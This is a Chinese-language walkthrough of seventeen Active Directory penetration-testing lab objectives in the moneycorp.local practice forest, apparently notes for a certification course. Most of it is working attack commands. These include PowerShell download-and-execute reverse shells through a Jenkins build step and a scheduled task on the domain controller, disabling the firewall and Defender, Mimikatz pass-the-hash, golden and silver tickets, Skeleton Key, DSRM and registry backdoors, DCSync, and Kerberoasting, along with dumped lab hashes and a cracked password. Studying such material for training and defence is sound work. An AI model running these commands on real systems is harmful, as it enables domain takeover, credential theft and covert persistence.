# Learning Objective 1:


```Task
● Enumerate following for the dollarcorp domain:
− Users
− Computers
− Domain Administrators
− Enterprise Administrators
− Shares
```


## 首先bypass powershell policy和AMSI，然后引入powerview

![image-20220306164751994](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306164751994.png)



## Users

命令：```Get-NetUser |select cn```

![image-20220306164958853](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306164958853.png)

## Computers

枚举当前域所有计算机

命令：``` Get-NetComputer```

![image-20220306165137578](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306165137578.png)

## Domain Administrators



枚举所有DA

命令：```Get-NetGroupMember -GroupName "Domain Admins" -Recurse```

![image-20220306165428856](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306165428856.png)



## Enterprise Administrators



Enterprise Administrators属于父域的用户组，所以枚举的时候需要加上父域的名称

命令：``` Get-NetGroupMember -GroupName "Enterprise Admins" -domain moneycorp.local  -Recurse```

![image-20220306170005975](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306170005975.png)



## Shares

命令：```Invoke-ShareFinder```

![image-20220306170243592](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306170243592.png)





# Learning Objective 2
```Task
● Enumerate following for the dollarcorp domain:
− List all the OUs
− List all the computers in the StudentMachines OU.
− List the GPOs
− Enumerate GPO applied on the StudentMachines OU.
```



##  List all the OUs

命令：```get-netou```

![image-20220306170550692](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306170550692.png)

## List all the computers in the StudentMachines OU.

命令：```Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}```

![image-20220306170653672](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306170653672.png)

## List the GPOs

命令：``` Get-NetGPO```

![image-20220306170836864](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306170836864.png)



## Enumerate GPO applied on the StudentMachines OU.

这里分两步

先获取StudentMachines里OU值里的gplink这个字段的值
```
PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
[LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
```

以上面的gplink作为传入参数，查询符合这个条件的所有GPO



```Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'```

![image-20220306171114786](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306171114786.png)





# Learning Objective 3:
```Task
● Enumerate following for the dollarcorp domain:
− ACL for the Users group
− ACL for the Domain Admins group
− All modify rights/permissions for the studentx
```



## ACL for the Users group

命令：```Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose```

![image-20220306171849514](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306171849514.png)

## ACL for the Domain Admins group

命令：```Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose```

![image-20220306172108674](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306172108674.png)

## All modify rights/permissions for the studentx

查看本账号所有修改的权限

命令：```Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "sudent366"}```

![image-20220306172243711](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306172243711.png)

啥都没有



# Learning Objective 4:

```Task
● Enumerate all domains in the moneycorp.local forest.
● Map the trusts of the dollarcorp.moneycorp.local domain.
● Map External trusts in moneycorp.local forest.
● Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
```



## Enumerate all domains in the moneycorp.local forest.

枚举森林里所有域

命令：``` Get-NetForestDomain -Forest  moneycorp.local```

![image-20220306165807913](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306165807913.png)

父域：moneycorp.local
父域DC：mcorp-dc.moneycorp.local

当前域：dollarcorp.moneycorp.local
当前域DC:dcorp-dc.dollarcorp.moneycorp.local

子域：us.dollarcorp.moneycorp.local



## Map the trusts of the dollarcorp.moneycorp.local domain.

枚举当前域的所有信任关系

命令：``` Get-NetDomainTrust -Domain dollarcorp.moneycorp.local```

![image-20220306172917520](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306172917520.png)



## Map External trusts in moneycorp.local forest.

枚举指定森林里的外部信任

命令：```Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq "External"} ```



![image-20220306173102532](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306173102532.png)

## Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?

注意上面dollarcorp.moneycorp.local和eurocorp.local的信任关系是Bidirectional（双向）的，所以我们可以从eurocorp.local里提取信息

命令：``` Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust```

![image-20220306173206243](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306173206243.png)



# Learning Objective 5:
```Task
● Exploit a service on dcorp-studentx and elevate privileges to local administrator.
● Identify a machine in the domain where studentx has local administrative access.
● Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server.
```



## Exploit a service on dcorp-studentx and elevate privileges to local administrator.

引入powerup，全盘检测，有至少两个方法可以提权

一个是未加引号的路径

![image-20220306174836200](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306174836200.png)



一个是可修改的服务

![image-20220306174917310](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306174917310.png)



利用可修改的服务，把当前账号加入到本地管理员组

命令：``` Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student366'```

![image-20220306175023097](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306175023097.png)



测试验证是否提权成功，以管理员身份打开一个shell，输入当前账号的用户名和密码

![image-20220306184512081](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306184512081.png)



已成功提权到管理员权限

## Identify a machine in the domain where studentx has local administrative access.

在上面的管理员权限shell里引入powerview，枚举当前账号有本地管理员权限的计算机

![image-20220306184832811](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306184832811.png)

除了当前计算机外还有一台机器

```dcorp-adminsrv.dollarcorp.moneycorp.local```





## Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server.

用```netsh advfirewall show currentprofile```命令查看防火墙状态

用```NetSh Advfirewall set allprofiles state off```命令关闭防火墙

关闭以后再次查看防火墙，已成功关闭

![image-20220306185145590](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306185145590.png)



关掉实时防护
```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```



## Jenkins!

在浏览器打开```http://172.16.3.11:8080```

运行了一个Jenkins! 程序

![image-20220306185427597](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306185427597.png)





jenkin!这个web app在未登陆的情况下，可以通过下面页面查看有什么账号
```http://172.16.3.11:8080/asynchPeople//```

![image-20220306185717493](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306185717493.png)

可以看到有builduser，jenkinsadmin，	manager三个账号

手动测试发现

Jenkins 登录账号信息是：
```builduser:builduser```

Jenkins特权提升，可以通过两种方法
1.  第一种是访问```http://172.16.3.11:8080/script```页面，如果当前账号拥有权限，将会被允许使用一个在线的console
2.  第二种是通过执行任务（例子页面：```http://172.16.3.11:8080/job/project0/```）,编译一段powershell反弹回来一个shell提权

powercat监听：

![image-20220306185837134](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306185837134.png)







另起一个shell，用python在ad工具目录下开一个http服务

![image-20220306190022728](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190022728.png)



去到```http://172.16.3.11:8080/me/my-views/view/all/```

选择其中一个project

![image-20220306190216002](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190216002.png)

点击configure

![image-20220306190331244](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190331244.png)

选择Build

![image-20220306190436222](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190436222.png)

把命令：

```powershell.exe iex (iwr http://172.16.100.66/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.66 -Port 443```

填入command，并且点击保存

![image-20220306190527275](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190527275.png)





点击Build Now，收到反弹回来的shell

![image-20220306190757811](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190757811.png)



# Learning Objective 6:
Task
● Setup BloodHound and identify a machine where studentx has local administrative access.

![image-20220306200024291](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306200024291.png)



从 BloodHound属于RDPUSERS组，这个组的成员对DCORP-ADMINSRV这台计算机有local administrative权限

所有student都在RDPUSERS组

![image-20220306200346148](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306200346148.png)



# Learning Objective 7

```Task
● Domain user on one of the machines has access to a server where a domain admin is logged in.
Identify:
− The domain user
− The server where the domain admin is logged in.
● Escalate privileges to Domain Admin
− Using the method above.
−  Using derivative local admin 
```





● Domain user on one of the machines has access to a server where a domain admin is logged in.
Identify:

从BloodHound可以知道svcadmin登录过dcorp-mgmt

![image-20220306200817797](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306200817797.png)

− The domain user

```svcadmin```

− The server where the domain admin is logged in.

```dcorp-mgmt```



● Escalate privileges to Domain Admin
− Using the method above.
−  Using derivative local admin 

这里采取从jenkins得到的管理员权限横向移动到```dcorp-mgmt```进行域权限提升的方法

引入powerview

```
iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
```



记得要bypass ps和AMSI

![image-20220306201616173](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306201616173.png)

可以看到可以横向到```dcorp-mgmt.dollarcorp.moneycorp.local```

引入mimikatz，导出ciadmin的哈希

![image-20220306202132064](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306202132064.png)



使用pass the hash，用收集回来的NTML新开一个ciamdin的shell

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:ciadmin /domain:dollarcorp.moneycorp.local /ntlm:e08253add90dccf1a208523d02998c3d /run:powershell.exe"'
```

横向到dcorp-mgmt

![image-20220306202552460](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306202552460.png)

引入mimikatz，导出scvadmin的NTML，这里甚至还有明文密码

![image-20220306202814646](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306202814646.png)

至此我们已经拿到了域管理员svcadmin的NTML



```scvadmin : b38ff50264b74508085d82c69794a4d8```



# Learning Objective 8:
```Task
● Dump hashes on the domain controller of dollarcorp.moneycorp.local.
● Using the NTLM hash of krbtgt account, create a Golden ticket.
● Use the Golden ticket to (once again) get domain admin privileges from a machine.
```



 ## Dump hashes on the domain controller of dollarcorp.moneycorp.local.

用上面收集到svcadmin账号信息，开一个DA的shell



```Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'```



可以看到我们现在已经可以横向到DC

![image-20220306203520614](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306203520614.png



![image-20220306203556004](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306203556004.png)



进入DC以后，bypass everything。dump出DC里的所有NTML信息

![image-20220306203808443](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306203808443.png)





已经拿到Administrator和krbtgt的用户信息

```

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : ff46a9d8bd66c6efd77603da26796f35

```



## Using the NTLM hash of krbtgt account, create a Golden ticket.

使用krbtgt制作黄金票据

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-
21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```



验证金票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```

![image-20220306204917861](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306204917861.png)





## Use the Golden ticket to (once again) get domain admin privileges from a machine.



因为制作了DA权限的黄金票据，所以可以横向到域内任何一台计算机，包括DC，也就是说可以dump出DC上的所有NTML哈希

![image-20220306205213235](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306205213235.png)









# Learning Objective 9:
```Task
● Try to get command execution on the domain controller by creating silver ticket for:
− HOST service
− WMI
```



这一节是制作银票。

金票和银票的分别
> 1.金票伪造的TGT(Ticket GrantingTicket)，所以可以获取任何Kerberos服务权限
> 2.银票是伪造的TGS的TS，只能访问指定的服务权限
> 3.GoldenTicket是由krbtgt的hash加密
> 4.Silver Ticket是由服务账户（通常为计算机账户）hash加密
> 5.GoldenTicket在使用的过程需要同域控通信
> 6.Silver Ticket在使用的过程不需要同域控通信

上面我们已经知道了DCORP-DC$的哈希，
```
RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 126289c16302fb23b71ec09f0d3d5391
```
可以用来制作银票

```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```



![image-20220306205608943](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306205608943.png)



打开Invoke-PowerShellTcp.ps1这个文件，在文件最低端加一行代码

```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```



![image-20220306205738398](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306205738398.png)

表示调用自己

新开一个shell，开启监听

![image-20220306210128953](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306210128953.png)



在银票shell下制作一个定时任务

```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User3666" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```



触发定时任务

```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User3666"
```



收到DC返回来的shell

![image-20220306210618463](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306210618463.png)

## WMI

RPCSS
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

然后执行WMI 

```
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

![image-20220306210901046](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306210901046.png)

# Learning Objective 10:
```Task
● Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack.
```

开一个DA shell

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```


### 方法1
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
### 方法2(推荐)
回到学生机器,创建一个DC的登录session
```
$sess = New-PSSession dcorp-dc.dollarcorp.moneycorp.local
```

把mimikatz加载到指定session
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

再次进入DC
```
 Enter-PSSession -Session $sess
```

执行mimikatz，制作万能钥匙
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```

开一个学生shell使用下面命令以student359的身份进入主机
```Enter-PSSession –Computername dcorp-std359.dollarcorp.moneycorp.local –credential dcorp\student359```



![image-20220306214152645](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306214152645.png)



输入密码：mimikatz



成功登陆

![image-20220306214255750](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306214255750.png)

# Learning Objective 11:
```Task
● Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
```



目录服务还原模式。除了krbtgt服务帐号外，域控上还有个可利用的账户：目录服务还原模式（DSRM）账户，这个密码是在DC安装的时候设置的，所以一般不会被修改

用有DA权限的shell，运行下面命令，dump出DSRM的哈希密码

![image-20220306220745688](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306220745688.png)



这里会出现Administrator的哈希(也就是DSRM的密码)：```a102ad5753f4c441e3af31c97fad86fd```

再用下面命令dump出现在Administrator的密码，与上面DSRM的密码进行比较

![image-20220306220856677](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306220856677.png)

新的密码是：```af0686cc0ca8f04df42210c9ac980760```

DSRM administrator不允许登陆，用之前的session进入DC修改

要先bypass ASMI

再运行下面命令，修改DSRM的远程登录策略
```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```



现在用DSRM的原始哈希，来运行一个有DA权限的shell,注意，这里的/domain参数指定的是dcorp-dc这台计算机，不是域的名字



```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

验证：

```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```



![image-20220306221226953](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306221226953.png)

可以访问文件系统，但是不能在这台系统上执行命令。

如果想要用DSRM获得一个shell，可以设置一个定时任务



# Learning Objective 12:
```Task
● Check if studentx has Replication (DCSync) rights.
● If yes, execute the DCSync attack to pull hashes of the krbtgt user.
● If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.
```



## Check if studentx has Replication (DCSync) rights.

查看当前账号是否有DCSync的能力

```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}

```



![image-20220307205932704](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307205932704.png)



没有任何返回，说明没有DCSync的能力

## If yes, execute the DCSync attack to pull hashes of the krbtgt user.

问题前提不成立

## If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.

开一个DA的shell

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```



添加完全控制权限
```
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student366 -Rights All -Verbose
```
再把Dcsync权限赋予当前学生账号student366
```
Add-ObjectAcl -TargetDistinguishedName"dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student366 -Rights DCSync -Verbose
```

再次查看本账号是否有Dcsync权限

```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

![image-20220307210310991](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307210310991.png)

已经出现```ActiveDirectoryRights : GenericAll```表示成功赋权

执行Dcsync,导出krbtgt哈希（也可以是其他用户,此操作需要在DA权限的shell里操作）
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```



![image-20220307210510322](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307210510322.png)



# Learning Objective 13:
```Task
● Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
● Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.
```

## Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.



在DA权限shell引入RACE.ps1框架
```
PS C:\ad> . .\RACE.ps1
```

为WMI修改安全描述符，允许student366进入WMI
```
Set-RemoteWMI -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
```

在学生shell（重启VM生效）查看
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```



![image-20220307215612058](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307215612058.png)



## Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.



设置远程权限，报错
```
PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc -Verbose
Processing data for a remote command failed with the following error message: The I/O operation has been aborted
because of either a thread exit or an application request. For more information, see the about_Remote_Troubleshooting
Help topic.
    + CategoryInfo          : OperationStopped: (dcorp-dc:String) [], PSRemotingTransportException
    + FullyQualifiedErrorId : JobFailure
    + PSComputerName        : dcorp-dc
```

引入RACE.ps1，域名写全(注意：这里如果不能正常设置，enter-psssesion到DC，bypass AMSI，远程加载RACE.ps1后在DC上设置)
```
PS C:\ad> . .\RACE.ps1
PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```


在学生shell向DC执行whoami命令
```
Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```



![image-20220307221601057](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307221601057.png)



### 无管理员密码的情况下从目标机器上dump出哈希

在DC上修改权限，允许本账号（student366）远程dump出哈希，在DAshell
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student366 -Verbose
```

在学生shell
引入框架
```
PS C:\ad> . .\RACE.ps1
```

dump出dcorp-dc这台机器的哈希
```
PS C:\ad> Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local

ComputerName                        MachineAccountHash
------------                        ------------------
dcorp-dc.dollarcorp.moneycorp.local 2b3cc837d80b9f5f69271cdfe5433822
```

现在我们有了这台机器的哈希，可以用来制作银票

```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:2b3cc837d80b9f5f69271cdfe5433822 /user:Administrator /ptt"'
```

基于HOST服务的银票

![image-20220307222449438](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307222449438.png)

基于RPCSS服务的银票

```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:2b3cc837d80b9f5f69271cdfe5433822 /user:Administrator /ptt"'
```



![image-20220307222528731](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307222528731.png)

可以建一个定时任务反弹DC这台服务器的shell



# Learning Objective 14:
```Task
● Using the Kerberoast attack, crack password of a SQL server service account.
```



什么是SPN？
> SPN(Service Principal name)服务器主体名称。
> 在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户（如 NetworkService 或 LocalSystem）或用户帐户下为服务器注册 SPN。对于内置帐户，SPN 将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册SPN。

查找所有SPN，会有很多返回，但主要查看域管理员开启的服务

```
Get-NetUser -spn |select userprincipalname,serviceprincipalname
```



![image-20220307223014352](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307223014352.png)



尤其留意域管理员的信息，这里svcadmin开启了SQL server服务。

因为svcadmin是一个域管理员，所以我们可以以它开启的服务请求一个tikcet

下面两条命令在学生shell下执行，如果报错了，可能是student VM的网络问题，重启一下

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```



![image-20220307223752293](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307223752293.png)



klist查看

![image-20220307223948494](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307223948494.png)



有MSSQLSvc的TGS。client就是学生账号student366

用Mimikatz dump出tikets



![image-20220307224108424](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307224108424.png)



在当前目录生成了一个TGS文件```1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```

拷贝到文件夹```kerberoast```，使用```tgsrepcrack.py```破解密码
执行命令：

```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```



![image-20220307224347704](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307224347704.png)



得到了svcadmin的明文密码
```
*ThisisBlasphemyThisisMadness!!
```

用上面的明文密码登陆dcorp-dc，输入明文密码后可以成功登录

![image-20220307224555333](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307224555333.png)



# Learning Objective 15:
```Task
● Enumerate users that have Kerberos Preauth disabled.
● Obtain the encrypted part of AS-REP for such an account.
● Determine if studentx has permission to set User Account Control flags for any user.
● If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.
```



## Enumerate users that have Kerberos Preauth disabled.

注意这里用的是dev版本的PowerView

枚举禁用了Kerberos预认证的用户

![image-20220307225109594](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307225109594.png)



## Obtain the encrypted part of AS-REP for such an account.

枚举到一个VPN359user用户禁用了Kerberos预认证
使用ASREPRoast.ps1获取kerb哈希值，这个值可以使用john等破解工具破解

![image-20220307225326455](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307225326455.png)





## Determine if studentx has permission to set User Account Control flags for any user.

枚举RDPUsers组成员对其中有GenericWrite 或者 GenericAll权限的用户

![image-20220307225619988](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307225619988.png)



因为当前账号（student366）在RDPUsers组中，而RDPUsers组对上面这些用户有GenericAll或者GenericWrite的权限，所以可以强制关闭这些用户的预认证
```
 Set-DomainObject -Identity Control359User -XOR @{useraccountcontrol=4194304} -Verbose
```

关闭以后获取这个用户的krb5哈希

```
Get-ASREPHash -UserName Control359User -Verbose
```



![image-20220307225731335](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307225731335.png)





# Learning Objective 16:
```Task
● Determine if studentx has permissions to set UserAccountControl flags for any user.
● If yes, force set a SPN on the user and obtain a TGS for the user.
```



从下面结果可以知道当前账号（student366，是RDPUsers组的成员），对下面显示的账号是有GenericAll权限的

![image-20220308203925347](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308203925347.png)



选择Support370User用户，查询这个账号是否有SPN

![image-20220308203957443](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308203957443.png)

没有。



因为本账号（student366，是RDPUsers组的成员），对这个用户有GenericAll权限，我们可以为其设置一个SPN

![image-20220308204051434](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204051434.png)



再次获取这个账号的SPN

![image-20220308204138682](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204138682.png)

根据这个SPN，我们可以请求一个可以被破解的ticket

![image-20220308204422988](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204422988.png)

使用klist命令列出SPN

![image-20220308204506049](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204506049.png)



看到已经有dcorp/whateverX的SPN

用mimikatz导出

![image-20220308204606898](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204606898.png)



导出来的tiket可以用tgsrepcrack.py破解

也可以用powerview导出krb5哈希，然后再用john破解

![image-20220308204701645](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204701645.png)



# Learning Objective 17:
```Task
•  Find a server in the dcorp domain where Unconstrained Delegation is enabled.
•  Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.
```

## Find a server in the dcorp domain where Unconstrained Delegation is enabled.

枚举非约束委派计算机（Unconstrained Delegation），使用powerview的dev版本

![image-20220308205103791](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308205103791.png)

枚举到两台计算机启用了无约束委派：dcorp-dc（DC服务器）和dcorp-appsrv

什么是无约束委派？

> 用户 A 去访问服务 B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问到的任意服务。

